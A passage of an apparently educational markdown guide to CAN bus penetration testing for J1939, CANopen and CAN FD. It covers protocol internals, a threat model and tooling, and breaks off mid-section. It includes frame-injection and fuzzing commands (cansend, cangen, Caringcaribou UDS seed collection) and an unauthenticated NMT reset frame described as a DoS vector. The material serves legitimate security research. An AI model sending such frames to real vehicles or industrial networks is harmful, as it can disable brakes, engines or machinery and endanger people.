<p align="center">
  <img  width="180" src="ghost.png" />
</p>

# 🚌 CAN Bus Penetration Testing: Complete End-to-End Guide
## J1939 · Classic CANopen · CAN FD — Security Research & Penetration Testing

> **⚠️ LEGAL DISCLAIMER**: This guide is intended **exclusively** for authorized security research, penetration testing with written permission, academic study, and development of defensive measures. Unauthorized access to vehicle or industrial networks is illegal under computer crime laws in most jurisdictions (e.g., CFAA in the USA, Computer Misuse Act in the UK, IT Act in India). Always obtain explicit written authorization before testing any system you do not own. The authors and contributors bear no responsibility for misuse.

---

## 📋 Table of Contents

1. [Introduction & Background](#1-introduction--background)
2. [CAN Bus Fundamentals (Deep Dive)](#2-can-bus-fundamentals-deep-dive)
3. [J1939 Protocol — In Depth](#3-j1939-protocol--in-depth)
4. [Classic CANopen Protocol — In Depth](#4-classic-canopen-protocol--in-depth)
5. [CAN FD Protocol — In Depth](#5-can-fd-protocol--in-depth)
6. [Threat Model & Attack Surface](#6-threat-model--attack-surface)
7. [Hardware Tools & Setup](#7-hardware-tools--setup)
8. [Software Tools (Open Source & Commercial)](#8-software-tools-open-source--commercial)
9. [Lab Environment Setup (Step-by-Step)](#9-lab-environment-setup-step-by-step)
10. [Penetration Testing Methodology](#10-penetration-testing-methodology)
11. [Phase 1 — Reconnaissance & Passive Sniffing](#11-phase-1--reconnaissance--passive-sniffing)
12. [Phase 2 — Active Scanning & Enumeration](#12-phase-2--active-scanning--enumeration)
13. [Phase 3 — Vulnerability Assessment](#13-phase-3--vulnerability-assessment)
14. [Phase 4 — Exploitation Techniques](#14-phase-4--exploitation-techniques)
15. [Phase 5 — Post-Exploitation](#15-phase-5--post-exploitation)
16. [Protocol-Specific Test Cases — J1939](#16-protocol-specific-test-cases--j1939)
17. [Protocol-Specific Test Cases — CANopen](#17-protocol-specific-test-cases--canopen)
18. [Protocol-Specific Test Cases — CAN FD](#18-protocol-specific-test-cases--can-fd)
19. [Fuzzing Strategies](#19-fuzzing-strategies)
20. [Reporting & Documentation](#20-reporting--documentation)
21. [Defensive Measures & Mitigations](#21-defensive-measures--mitigations)
22. [CTF/Learning Resources & References](#22-ctflearning-resources--references)

---

## 1. Introduction & Background

### 1.1 What is CAN Bus?

The **Controller Area Network (CAN)** is a robust, message-based communication protocol developed by **Robert Bosch GmbH** in 1983 and standardized as **ISO 11898**. Originally designed for automotive ECU (Electronic Control Unit) communication without a host computer, it has since permeated:

- **Automotive systems** — engine, brakes, steering, body electronics
- **Heavy-duty vehicles** — trucks, buses, excavators, agriculture equipment (J1939)
- **Industrial automation** — robotics, PLCs, factory floor equipment (CANopen)
- **Medical devices** — imaging equipment, operating tables
- **Aerospace** — flight management systems
- **Marine electronics** — NMEA 2000 (built on CAN/J1939)

### 1.2 Why CAN Security Matters

CAN was **designed in an era of isolated networks**. The three core design assumptions that make it insecure today are:

| Design Assumption | Original Justification | Modern Problem |
|---|---|---|
| No authentication | Physical access = trust | Remote attacks via OBD, telematics, Bluetooth |
| No source addresses | All nodes are peers | Cannot verify message origin |
| No encryption | Deterministic real-time | Eavesdropping, replay, injection trivial |
| Broadcast bus | Efficiency | Any node can send anything |

The **2015 Jeep Cherokee remote hack** by Miller & Valasek, published at DEF CON, demonstrated that a remote attacker could kill a vehicle engine on a highway via a CAN injection attack delivered over a cellular connection. This single research paper fundamentally changed how the automotive industry views CAN security.

### 1.3 Standards Genealogy

```
ISO 11898 (Physical + Data Link)
├── CAN 2.0A  (11-bit ID, Classic)
├── CAN 2.0B  (29-bit ID, Extended)
├── CAN FD    (ISO 11898-1:2015, up to 64 bytes, higher baud rate)
└── CAN XL   (ISO 11898-1:2024, up to 2048 bytes — emerging)

Higher Layer Protocols (HLP)
├── SAE J1939     → Heavy-duty vehicles (trucks, buses, agriculture)
├── CANopen       → Industrial automation (CiA 301+)
├── OBD-II/KWP    → Passenger vehicle diagnostics
├── NMEA 2000     → Marine electronics (J1939 variant)
├── ISO 11783 (ISOBUS) → Agriculture (J1939 variant)
├── DeviceNet     → Rockwell-era factory automation
└── ISO 14229 (UDS) → Unified Diagnostic Services (sits on top of J1939/CAN)
```

---

## 2. CAN Bus Fundamentals (Deep Dive)

### 2.1 Physical Layer

**Topology**: Multi-drop linear bus with two termination resistors (120Ω each at each end).

**Wires**: Two differential signal wires:
- **CAN_H** (CAN High) — dominant = ~3.5V, recessive = ~2.5V
- **CAN_L** (CAN Low) — dominant = ~1.5V, recessive = ~2.5V

The differential nature (CANH - CANL = 2V dominant, 0V recessive) provides excellent **common-mode noise rejection** — critical in automotive environments with alternators, ignition coils, and electric motors.

**Speed vs Distance**:
| Baud Rate | Max Cable Length |
|---|---|
| 1 Mbit/s | ~40 meters |
| 500 Kbit/s | ~100 meters |
| 250 Kbit/s | ~250 meters |
| 125 Kbit/s | ~500 meters |

### 2.2 Data Link Layer — Frame Types

#### Standard Data Frame (CAN 2.0A — 11-bit ID)

```
 SOF | ARBITRATION FIELD | CONTROL | DATA (0-8 bytes) | CRC | ACK | EOF
  1  |    11-bit ID + RTR | IDE+DLC |     0-64 bits    | 16  |  2  |  7
```

#### Extended Data Frame (CAN 2.0B — 29-bit ID)

```
 SOF | BASE ID (11) | SRR | IDE | EXT ID (18) | RTR | DLC | DATA | CRC | ACK | EOF
```

**Key Fields Explained**:

- **SOF (Start of Frame)**: Single dominant bit signals transmission start
- **Arbitration ID**: Lower numerical value = higher priority. Non-destructive bitwise CSMA/CA ensures highest priority message wins bus contention without frame corruption
- **RTR (Remote Transmission Request)**: 1 = requesting data from another node; 0 = data frame. RTR frames are largely deprecated in modern HLPs
- **IDE (Identifier Extension)**: 0 = 11-bit standard; 1 = 29-bit extended
- **DLC (Data Length Code)**: 4 bits, values 0–8 (number of data bytes)
- **CRC**: 15-bit CRC + 1 delimiter bit. Detects bit errors
- **ACK**: Any receiver pulls this dominant to acknowledge receipt (even if it doesn't understand the message)
- **EOF (End of Frame)**: 7 recessive bits

### 2.3 Error Detection & Confinement

CAN has five built-in error detection mechanisms:
1. **CRC check** — detects up to 5 random bit errors in a frame
2. **Frame check** — checks bit fields are in correct positions (ACK, EOF)
3. **Bit monitoring** — transmitter monitors bus; if sent != received → error
4. **Bit stuffing** — after 5 consecutive same-polarity bits, a complementary "stuff bit" is inserted; violation = Stuff Error
5. **Message-level acknowledgment** — if no ACK received → error

**Error States (important for attack understanding)**:
- **Error Active**: Normal operation, sends active error flags (6 dominant bits)
- **Error Passive**: After 128 errors, sends passive error flags (6 recessive bits — silent)
- **Bus Off**: After 256 errors, node disconnects from bus entirely

> **Security Relevance**: An attacker can exploit the error confinement mechanism to deliberately push a legitimate node into "Bus Off" state, effectively performing a **Denial of Service** against a specific ECU.

### 2.4 Bus Arbitration — Security Implication

Any node can transmit any message ID at any time. There is **no binding between a node and a message ID**. This is the root cause of injection attacks: a malicious node can transmit frames with any ID, including safety-critical IDs that should only come from specific ECUs.

---

## 3. J1939 Protocol — In Depth

### 3.1 Overview & Standards Document Set

SAE J1939 is published by SAE International and consists of multiple sub-standards:

| Sub-Standard | Content |
|---|---|
| J1939-11 | Physical Layer — 250 Kbps twisted shielded pair |
| J1939-13 | Off-board diagnostic connector (9-pin Deutsch) |
| J1939-14 | Physical Layer — 500 Kbps |
| J1939-21 | Data Link Layer |
| J1939-31 | Network Layer (bridges/routers) |
| J1939-71 | Vehicle Application Layer |
| J1939-73 | Diagnostics (DM messages) |
| J1939-75 | Generator Sets & Industrial |
| J1939-81 | Network Management |
| J1939-82 | Compliance |

### 3.2 J1939 Frame Structure (29-bit Extended ID)

The 29-bit CAN identifier in J1939 is structured as:

```
Bits 28-26: Priority (3 bits, 0=highest, 7=lowest)
Bit 25:     Reserved (R)
Bit 24:     Data Page (DP)
Bits 23-16: PDU Format (PF) — 8 bits
Bits 15-8:  PDU Specific (PS) — 8 bits  [destination addr if PF < 240, or group ext if PF ≥ 240]
Bits 7-0:   Source Address (SA) — 8 bits
```

### 3.3 Parameter Group Numbers (PGN)

The **PGN** is extracted from the 29-bit identifier:

```
PGN = (DP << 17) | (PF << 8) | PS   [when PF >= 240, PDU2 format]
PGN = (DP << 17) | (PF << 8)        [when PF < 240, PDU1 format — PS is destination]
```

**Commonly exploited PGNs**:
| PGN (hex) | Name | Security Interest |
|---|---|---|
| 0x00FECA | DM1 — Active Diagnostic Trouble Codes | Read/inject fault codes |
| 0x00FECB | DM2 — Previously Active DTCs | History manipulation |
| 0x00FEEC | DM11 — Diagnostic Data Clear | Erase fault memory |
| 0x00FEF1 | EEC2 — Electronic Engine Controller 2 | Throttle manipulation |
| 0x00F004 | EEC1 — Engine Speed/Torque | RPM spoofing |
| 0x00FEF0 | EBC1 — Electronic Brake Controller | Brake system messages |
| 0x00FEF5 | ETC1 — Electronic Transmission Controller | Gear manipulation |
| 0x00EA00 | Request PGN | Request any PGN from any node |
| 0x00EE00 | Address Claimed | Address claim spoofing |
| 0x00EC00 | Transport Protocol CM | Multi-packet session attacks |
| 0x00EB00 | Transport Protocol DT | Multi-packet data attacks |

### 3.4 Suspect Parameter Numbers (SPN)

Each PGN contains **SPNs** — individual signals within the 8 data bytes. For example, in Engine Electronic Controller 1 (EEC1, PGN F004h):

| SPN | Bit Position | Scale | Description |
|---|---|---|---|
| 190 | Bytes 4-5 | 0.125 RPM/bit | Engine Speed |
| 899 | Byte 1, bits 4-7 | — | Engine Torque Mode |
| 512 | Bytes 3-4 | 0.1%/bit | Driver Demand Torque |

### 3.5 J1939 Transport Protocol

For messages > 8 bytes (up to 1785 bytes), J1939 uses a **Transport Protocol (TP)**:

**Connection Mode (CM_TP)** — for peer-to-peer:
```
Step 1: Sender → RTS (Request to Send) → Receiver
         PGN=0xEC00, CM byte=16 (0x10)
         [message_length, num_packets, max_packets, PGN]
Step 2: Receiver → CTS (Clear to Send) → Sender  
         CM byte=17 (0x11)
Step 3: Sender → DT (Data Transfer) frames [PGN=0xEB00]
Step 4: Receiver → EndofMsgAck → Sender
```

**Broadcast Announce Message (BAM)** — for global broadcast:
```
Sender broadcasts BAM (CM byte=32=0x20), then sends all DT frames
No handshaking — anyone on bus receives
```

> **Security Note**: The TP implementation in ECU firmware is a common source of memory corruption vulnerabilities. Malformed RTS/BAM with incorrect `message_length` or `num_packets` fields have triggered buffer overflows in production ECUs.

### 3.6 J1939 Address Claiming

J1939 uses **dynamic address claiming** (J1939-81):

```
1. ECU powers on and sends "Address Claimed" message (PGN 0xEE00) 
   with its 64-bit NAME field and claimed address
2. If another ECU has the same address but higher-priority NAME, 
   it sends a competing claim
3. Lower-priority ECU must choose a new address or go offline
4. "Cannot Claim Address" PGN 0xEEFF is sent if no address available
```

**Security implication**: An attacker with a higher-priority (lower numerical) NAME can **steal any address** on the J1939 network, including safety-critical ECU addresses.

---

## 4. Classic CANopen Protocol — In Depth

### 4.1 Overview

CANopen is defined by CAN in Automation (CiA) standards, primarily **CiA 301**. It is widely used in:
- Industrial automation (servo drives, PLCs, sensors)
- Medical equipment (radiation therapy machines, surgical tables)
- Building automation
- Railway systems

### 4.2 CANopen COB-ID Structure

CANopen uses **11-bit CAN IDs** structured as:

```
COB-ID = Function Code (4 bits) + Node-ID (7 bits)
```

**Function Code → COB-ID ranges**:
| Function | Function Code | COB-ID Range | Description |
|---|---|---|---|
| NMT | 0x0 | 0x000 | Network Management |
| SYNC | 0x1 | 0x080 | Synchronization |
| EMCY | 0x1 | 0x081–0x0FF | Emergency message |
| TIME | 0x2 | 0x100 | Time stamp |
| TPDO1 | 0x3 | 0x181–0x1FF | Process Data Object (TX) |
| RPDO1 | 0x4 | 0x201–0x27F | Process Data Object (RX) |
| TPDO2 | 0x5 | 0x281–0x2FF | Process Data Object (TX) |
| RPDO2 | 0x6 | 0x301–0x37F | Process Data Object (RX) |
| TPDO3 | 0x7 | 0x381–0x3FF | Process Data Object (TX) |
| RPDO3 | 0x8 | 0x401–0x47F | Process Data Object (RX) |
| TPDO4 | 0x9 | 0x481–0x4FF | Process Data Object (TX) |
| RPDO4 | 0xA | 0x501–0x57F | Process Data Object (RX) |
| SDO Tx | 0xB | 0x581–0x5FF | Service Data Object (server→client) |
| SDO Rx | 0xC | 0x601–0x67F | Service Data Object (client→server) |
| Heartbeat/NMT Error | 0xE | 0x701–0x77F | Node state monitoring |

### 4.3 CANopen Object Dictionary

Every CANopen device has an **Object Dictionary (OD)** — a structured database of all device parameters and data:

```
Index (16-bit) + Sub-index (8-bit) → Data object
```

Critical indices:
| Index | Content | Security Relevance |
|---|---|---|
| 0x1000 | Device Type | Fingerprinting |
| 0x1001 | Error Register | Error injection detection |
| 0x1005 | SYNC COB-ID | SYNC timing attacks |
| 0x1017 | Producer Heartbeat Time | DoS via heartbeat manipulation |
| 0x1018 | Identity Object (Vendor ID, Product Code) | Device enumeration |
| 0x1280-0x12FF | SDO Parameter | SDO channel configuration |
| 0x1400-0x15FF | RPDO Communication Parameters | PDO flooding targets |
| 0x1600-0x17FF | RPDO Mapping | Decoding received PDO content |
| 0x1A00-0x1BFF | TPDO Mapping | Understanding transmitted data |

### 4.4 NMT (Network Management) States

NMT controls node lifecycle — sent from NMT master (typically Node 0 / PLC):

```
         INITIALIZING
              │
         PRE-OPERATIONAL ←────────────────┐
              │                           │
         OPERATIONAL ←──────────────┐    │
              │                     │    │
         STOPPED ←──────────────────┘────┘
```

**NMT Commands (sent to COB-ID 0x000)**:
| Command Byte | Command | Hazard |
|---|---|---|
| 0x01 | Start Node (→ OPERATIONAL) | Force node into operation |
| 0x02 | Stop Node (→ STOPPED) | Freeze motor/actuator |
| 0x80 | Enter PRE-OPERATIONAL | Disable PDO communications |
| 0x81 | Reset Application | Hard ECU reset |
| 0x82 | Reset Communication | Restart CANopen stack |

> **CRITICAL**: NMT commands have **no authentication**. Any node on the bus can send `0x00 0x81 0x00` to reset ALL nodes simultaneously — a powerful DoS attack vector.

### 4.5 SDO (Service Data Object)

SDOs provide configuration and diagnostic access to the Object Dictionary. SDO transfers:
- **Expedited** (≤4 bytes): Single request/response pair
- **Segmented** (>4 bytes): Multiple segments with handshaking
- **Block transfer**: Optimized for large data

**SDO Request format (COB-ID 0x600 + Node-ID)**:
```
Byte 0: Command specifier (cs)
Bytes 1-2: Index (little-endian)
Byte 3: Sub-index
Bytes 4-7: Data (for write) or zeros (for read)
```

| cs byte | Operation |
|---|---|
| 0x40 | SDO Read (Upload Request) |
| 0x60 | SDO Write Acknowledge |
| 0x2F | SDO Write 1 byte |
| 0x2B | SDO Write 2 bytes |
| 0x27 | SDO Write 3 bytes |
| 0x23 | SDO Write 4 bytes |
| 0x80 | SDO Abort |

### 4.6 PDO (Process Data Object)

PDOs carry real-time process data. **RPDOs** are received by a node; **TPDOs** are transmitted by a node. PDO transmission modes:
- **Synchronous** (after N SYNC messages)
- **Asynchronous / Event-driven** (on value change or timer)
- **RTR-triggered** (deprecated)

---

## 5. CAN FD Protocol — In Depth

### 5.1 What Changed in CAN FD

CAN FD (Flexible Data-rate) was introduced by Bosch in 2012 and standardized in **ISO 11898-1:2015**. Key differences:

| Feature | Classic CAN | CAN FD |
|---|---|---|
| Max payload | 8 bytes | 64 bytes |
| Data phase baud rate | Same as arbitration | Up to 8 Mbit/s (vs 1 Mbit/s) |
| CRC | 15-bit | 17-bit or 21-bit (depends on DLC) |
| Frame indicator | — | BRS bit (Bit Rate Switch) |
| Error detection | — | Improved stuff bit counting |

### 5.2 CAN FD Frame Structure

```
SOF | Arbitration (11-bit) | r1 | IDE | EDL | r0 | BRS | ESI | DLC (4-bit) 
| DATA (0, 1, 2, 3, 4, 5, 6, 7, 8, 12, 16, 20, 24, 32, 48, or 64 bytes)
| CRC (17 or 21-bit + SFD) | ACK | EOF
```

**New bits**:
- **EDL (Extended Data Length)**: Marks frame as CAN FD (recessive)
- **BRS (Bit Rate Switch)**: After BRS, data phase uses higher baud rate
- **ESI (Error Status Indicator)**: Reflects node's error state

### 5.3 CAN FD DLC Encoding

CAN FD uses a non-linear DLC mapping for payloads > 8 bytes:

| DLC | Data Bytes |
|---|---|
| 0–8 | 0–8 (same as classic) |
| 9 | 12 |
| 10 | 16 |
| 11 | 20 |
| 12 | 24 |
| 13 | 32 |
| 14 | 48 |
| 15 | 64 |

### 5.4 J1939 over CAN FD (J1939-FD)

SAE has released updates for J1939 over CAN FD:
- **J1939-17** defines CAN FD physical layer for J1939
- **J1939-22** (FEFF) defines how to use CAN FD data phase
- Backward compatibility requires special gateways between CAN FD and classic CAN J1939 segments

### 5.5 CAN FD Security Considerations

- **No new authentication mechanisms** — same trust model as classic CAN
- The larger payload (64 bytes) increases the data that can be injected in a single frame
- Higher baud rates make passive sniffing more challenging but not impossible with proper hardware
- **CAN FD to Classic CAN gateway vulnerabilities**: Malformed CAN FD frames can cause undefined behavior in gateway ECUs

---

## 6. Threat Model & Attack Surface

### 6.1 Attacker Entry Points

```
┌─────────────────────────────────────────────────────────────┐
│                    VEHICLE / SYSTEM                         │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐  │
│  │Telematics│  │OBD-II/   │  │Wireless  │  │Physical  │  │
│  │Gateway   │  │J1939 Port│  │Interfaces│  │Wiring    │  │
│  │(LTE/5G)  │  │          │  │(BT/WiFi) │  │Harness   │  │
│  └────┬─────┘  └────┬─────┘  └────┬─────┘  └────┬─────┘  │
│       └─────────────┴──────────────┴──────────────┘        │
│                          CAN Bus                            │
│  ┌──────┐ ┌──────┐ ┌──────┐ ┌──────┐ ┌──────┐ ┌──────┐  │
│  │ ECU1 │ │ ECU2 │ │ ECU3 │ │ ECU4 │ │ ECU5 │ │ ECU6 │  │
│  │Engine│ │Brake │ │Trans │ │Body  │ │ADAS  │ │Gateway│  │
│  └──────┘ └──────┘ └──────┘ └──────┘ └──────┘ └──────┘  │
└─────────────────────────────────────────────────────────────┘
```

**Remote Entry Points (No Physical Access)**:
- OTA (Over-the-Air) update channels
- Telematics unit (cellular modem) → gateway → CAN
- Infotainment system Wi-Fi/Bluetooth attack → pivot to CAN
- V2X (Vehicle-to-Everything) communication interfaces

**Physical Entry Points**:
- OBD-II diagnostic port (passenger vehicles, present J1939 for trucks)
- J1939 9-pin Deutsch connector (heavy vehicles — accessible under dash)
- Direct wire tap on CAN_H/CAN_L (requires opening wiring harness)
- JTAG/UART debugging ports on ECUs

### 6.2 Attack Categories

| Category | Description | Protocols Affected |
|---|---|---|
| **Passive Eavesdropping** | Silent sniffing of bus traffic | All |
| **Active Frame Injection** | Inserting malicious CAN frames | All |
| **Replay Attack** | Capturing and retransmitting legitimate frames | All |
| **Denial of Service (DoS)** | Bus flooding, Error flag injection, Bus-Off attacks | All |
| **ECU Impersonation** | Claiming another node's address/function | J1939 (address claim), CANopen (NMT) |
| **Diagnostic Abuse** | Using UDS/DM services to read/write memory, flash firmware | J1939 DM, UDS |
| **Fuzzing** | Malformed frames to trigger bugs in ECU firmware | All |
| **Timing Attacks** | Manipulating message timing to cause safety violations | J1939, CANopen |
| **Transport Protocol Attacks** | Malformed multi-frame packets | J1939 TP, ISO-TP |
| **Gateway Bypass** | Exploiting gateway logic to bridge security domains | All |

---

## 7. Hardware Tools & Setup

### 7.1 Essential CAN Interfaces (USB to CAN Adapters)

#### Budget / Open Source Category ($10–$50)

| Device | Protocol | OS Support | Notes |
|---|---|---|---|
| **CANable / CANtact** | CAN 2.0 | Linux/Win/Mac (SocketCAN) | candleLight firmware; ~$20 |
| **CandleLight (GVRET)** | CAN 2.0 | Linux (SocketCAN) | Open hardware design |
| **MCP2515 + SPI (Raspberry Pi)** | CAN 2.0 | Linux (MCP251x driver) | DIY, excellent for labs |
| **PiCAN2 (for Raspberry Pi)** | CAN 2.0 | Linux (SocketCAN) | Clean HAT form factor |
| **ESP32 with SN65HVD230** | CAN 2.0 | Arduino/IDF | Wireless capability |
| **Teensy 3.x + MCP2562** | CAN 2.0 | Arduino | GVRET firmware for SavvyCAN |

#### Mid-Range ($100–$500)

| Device | Protocol | OS Support | Notes |
|---|---|---|---|
| **PEAK PCAN-USB** | CAN 2.0 | Linux/Win/Mac | SocketCAN compatible; ~$200 |
| **PEAK PCAN-USB FD** | CAN FD | Linux/Win/Mac | CAN FD support; ~$350 |
| **Kvaser Leaf Light v2** | CAN 2.0 | Linux/Win | SocketCAN via kvaser-linuxcan |
| **Kvaser Leaf Pro HS v2** | CAN FD | Linux/Win | CAN FD support |
| **USB2CAN by 8devices** | CAN 2.0 | Linux (SocketCAN) | gs_usb driver |
| **canable.io** | CAN 2.0/FD | Linux/Win | Modern candleLight compatible |

#### Professional / Industrial ($500–$5000+)

| Device | Protocol | Special Features |
|---|---|---|
| **Kvaser USBcan Pro 2xHS v2** | CAN/CAN FD | Dual channel, t-script, CAN FD up to 8Mbit/s |
| **Kvaser Leaf SemiPro HS** | CAN 2.0 | Log to SD, galvanic isolation |
| **IXXAT USB-to-CAN FD** | CAN/CAN FD | Industrial grade, VCI driver |
| **Vector VN1630A** | CAN/CAN FD/LIN | Industry standard; CANalyzer compatible |
| **Intrepidcs neoVI FIRE 2** | Multi-bus | CAN, LIN, FlexRay, Ethernet; Python API |
| **Intrepidcs ValueCAN 3** | CAN | Entry-level neoVI; Python via python-ics |
| **Warwick X-Analyser + Kvaser** | CAN/FD/LIN/J1939/CANopen | Integrated protocol decoder |
| **Kvaser U100-X1** | CAN/CAN FD | J1939-13 Type II connector; isolated |

#### Specialist / Security Research Tools

| Device | Notes |
|---|---|
| **OpenGarages CANBus Triple** | 3-channel; designed for automotive security research |
| **ChipWhisperer (NewAE)** | Side-channel attacks on CAN ECUs; power analysis |
| **Riscure Inspector** | Professional automotive hardware security analysis |
| **Lauterbach TRACE32** | ECU JTAG debugger; used post-exploitation |

### 7.2 Physical Access Hardware

| Tool | Use |
|---|---|
| **9-pin Deutsch J1939 breakout** | Non-invasive tap into J1939 network |
| **OBD-II to DB9 adapter** | Passenger vehicle CAN access |
| **J1939 T-harness** | In-line tap without cutting wires |
| **DSO (Digital Oscilloscope)** | Physical signal analysis, bus timing verification |
| **Logic analyzer (e.g., Saleae Logic)** | Protocol decode at bit level |
| **Termination resistors (120Ω)** | Required when building test bench |
| **CAN bus termination checker** | Verify network termination before connecting |
| **Deutsch DT connector kit** | For custom test harnesses |

### 7.3 Lab Test Bench Construction

**Minimum viable lab**:
```
PC (Linux) ──USB── [CAN Interface] ──DB9──┬── [Target ECU 1]
                                          ├── [Target ECU 2] 
                                          ├── 120Ω terminator
                                          └── 120Ω terminator (other end)
```

**Recommended lab for J1939 research**:
```
PC 1 (attacker) ──USB── PEAK PCAN-USB ──J1939 Harness──┬── Heavy Truck ECU (Engine)
                                                         ├── Heavy Truck ECU (Transmission)
                                                         ├── J1939 Display/Cluster (target)
                                                         └── Resistor network (120Ω × 2)

PC 2 (monitor)  ──USB── Kvaser Leaf (listen-only mode)  ┘  (passive tap)
```

---

## 8. Software Tools (Open Source & Commercial)

### 8.1 Linux SocketCAN Foundation

SocketCAN is the Linux kernel's built-in CAN support (kernel ≥ 2.6). It exposes CAN interfaces like network interfaces (`can0`, `can1`, etc.).

**GitHub**: https://github.com/linux-can/can-utils

**Installation**:
```bash
sudo apt-get install can-utils
```

**Core utilities**:
```bash
# Bring up CAN interface
sudo ip link set can0 up type can bitrate 250000

# For CAN FD
sudo ip link set can0 up type can bitrate 500000 dbitrate 2000000 fd on

# Dump all frames to terminal
candump can0

# Dump to log file
candump -l can0

# Send a single frame
cansend can0 18FEF004#0102030405060708

# Replay a log file
canplayer -I candump.log

# Bit error injection
cangen can0 -I 0x1FFFFFFF -L 8 -D i -g 1   # random ID, 8 bytes, incrementing data

# CAN bus statistics
canstat can0

# Filter and display specific IDs
candump can0 18FEF004:1FFFFFFF    # J1939 EEC1 filter

# canbusload — show bus load percentage  
canbusload can0@250000
```

### 8.2 Security Research Tools

#### Caring Caribou (CaringCaribou)
**The "nmap" for automotive CAN/UDS security**

- **GitHub**: https://github.com/CaringCaribou/caringcaribou
- **Fork (updated)**: https://github.com/Cr0wTom/caringcaribounext
- **Language**: Python 3
- **Requires**: python-can

```bash
# Installation
pip3 install python-can
git clone https://github.com/CaringCaribou/caringcaribou.git
cd caringcaribou
pip3 install -e .

# Configure interface in ~/.canrc:
# [default]
# interface = socketcan
# channel = can0

# Dump all traffic
caringcaribou dump

# Discover ECUs via UDS
caringcaribou uds discovery

# Scan UDS services on discovered ECU
caringcaribou uds services 0x7e0 0x7e8

# Brute-force sub-services
caringcaribou uds subservices 0x7e0 0x7e8 0x10

# Collect security seeds
caringcaribou uds security_seed 0x7e0 0x7e8 0x01

# Dump all DIDs
caringcaribou uds dump_dids 0x7e0 0x7e8

# Seed randomness fuzzing
caringcaribou fuzzer seed_randomness_fuzzer 0x7e0 0x7e8 0x01

# Send arbitrary message
caringcaribou send message 0x18FEF004#0102030405060708
```

**Modules available**:
- `dump` — passive sniff
- `send` — raw frame injection / replay
- `uds` — full UDS/ISO14229 scanner (discovery, services, subservices, security_seed, dump_dids)
- `fuzzer` — UDS fuzzing
- `xcp` — XCP (calibration protocol) support
- `doip` — Diagnostics over IP (Ethernet)

#### SavvyCAN
**Cross-platform GUI CAN analyzer and reverse engineering tool**

- **GitHub**: https://github.com/collin80/SavvyCAN
- **Platform**: Linux, Windows, macOS

```bash
# Build from source (Linux)
sudo apt-get install qt5-default qtserialbus5-dev
git clone https://github.com/collin80/SavvyCAN.git
cd SavvyCAN
qmake
make
./SavvyCAN
```

**Key features for pentest**:
- Live frame capture and display
- DBC file loading for signal decoding
- Traffic filtering and highlighting
- Graphing of signal values over time
- Frame comparison and diffing
- Replay with timing
- Fuzz frame sender (random or sequential)
- Flow analysis (message frequency, timing anomalies)

#### cantools
**Python library for DBC-based CAN decoding**

- **GitHub**: https://github.com/cantools/cantools

```bash
pip3 install cantools

# Command line decode
candump can0 | python3 -m cantools decode vehicle.dbc

# Python API
import cantools
db = cantools.database.load_file('vehicle.dbc')
msg = db.get_message_by_name('EEC1')
data = bytes([0x01, 0x02, 0x80, 0x00, 0x50, 0x00, 0xFF, 0xFF])
decoded = msg.decode(data)
print(decoded)  # {'EngineSpeed': 256.0, 'DriverDemandTorque': 80.0, ...}
```

#### python-can
**Unified Python CAN interface library**

- **GitHub**: https://github.com/hardbyte/python-can
- **Docs**: https://python-can.readthedocs.io

```bash
pip3 install python-can

# Basic send/receive
import can

bus = can.interface.Bus(channel='can0', bustype='socketcan')

# Send a frame
msg = can.Message(
    arbitration_id=0x18FEF004,
    data=[0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08],
    is_extended_id=True
)
bus.send(msg)

# Receive frames
for msg in bus:
    print(f"ID: {msg.arbitration_id:08X}  Data: {msg.data.hex()}")
```

#### CANToolz
**Black-box CAN network analysis framework (modular)**

- **GitHub**: https://github.com/CANToolz/CANToolz

Modules include: scan, replay, fuzzer, analyzer, iso_tp, uds

```bash
pip3 install cantoolz
# Configure in JSON, run analysis pipeline
canToolz -c config.json
```

#### Scapy (Automotive Extensions)
**Packet manipulation with automotive protocol support**

- **GitHub**: https://github.com/secdev/scapy
- **Automotive docs**: https://scapy.readthedocs.io/en/latest/layers/automotive.html

```bash
pip3 install scapy

from scapy.all import *
from scapy.contrib.automotive.can import *
from scapy.contrib.automotive.isotp import *
from scapy.contrib.automotive.uds import *

# Send J1939 frame
frame = CAN(identifier=0x18FEF004, length=8, 
            data=b'\x01\x02\x03\x04\x05\x06\x07\x08')
sendp(frame, iface='can0')

# UDS scan via ISO-TP
conf.contribs['ISOTP']['use-can-isotp-kernel-module'] = True
sock = ISOTPSocket('can0', tx_id=0x7E0, rx_id=0x7E8)
uds_pkt = UDS() / UDS_DSC(diagnosticSessionType=0x01)
resp = sock.sr1(uds_pkt, timeout=2)
```

#### ICSim (Instrument Cluster Simulator)
**Virtual CAN test environment — no real car needed**

- **GitHub**: https://github.com/zombieCraig/ICSim

```bash
git clone https://github.com/zombieCraig/ICSim.git
cd ICSim
./setup_vcan.sh     # creates vcan0 virtual interface
./icsim vcan0       # launch virtual instrument cluster
./controls vcan0    # launch controller
```

This is the **ideal starting environment** — practice all attacks on virtual instruments (speedometer, turn signals, door locks) with zero risk.

#### CANalyse
**Vehicle network analysis and attack tool**

- **GitHub**: https://github.com/KartheekLade/CANalyse

#### canhack
**Low-level CAN protocol hacking library (C)**

- **GitHub**: https://github.com/kentindell/canhack
- Operates at bit level — can inject error frames, corrupt specific bits

#### UDSim / uds-server
**UDS ECU simulator and fuzzer**

- **GitHub**: https://github.com/zombieCraig/UDSim
- **GitHub**: https://github.com/zombieCraig/uds-server

#### CANopenTerm
**CANopen development, testing, and analysis tool**

- **GitHub**: https://github.com/CANopenTerm/CANopenTerm
- Supports SDO read/write, NMT commands, J1939 and OBD-II

#### BUSMASTER (Open Source)
**Full automotive bus simulation, analysis, and test environment**

- **GitHub**: https://github.com/rbei-etas/busmaster
- **Platform**: Windows
- Supports CAN, LIN, J1939 decoding, test scripting

#### TSMaster
**Powerful automotive bus testing (free for education/research)**

- **GitHub**: https://github.com/TOSUN-Shanghai/TSMaster
- Supports: CAN, CAN FD, LIN, FlexRay
- Hardware: TOSUN, Vector, IXXAT, PEAK, Kvaser, Intrepidcs, ZLG, CANable, CandleLight
- Python scripting support

### 8.3 J1939-Specific Tools

| Tool | Link | Description |
|---|---|---|
| **python-j1939** | https://github.com/milhead2/python-j1939 | Pure Python J1939 stack |
| **can-j1939 (Linux kernel module)** | kernel ≥ 5.4 built-in | Native J1939 socket support |
| **JCOM1939 Monitor** | Commercial | Professional J1939 analyzer |
| **J1939 Analyzer Pro** | Commercial | PGN/SPN decoding, DM support |
| **Wireshark + J1939 dissector** | Built-in | Decode J1939 from captured pcap |

**Linux J1939 socket (kernel ≥ 5.4)**:
```bash
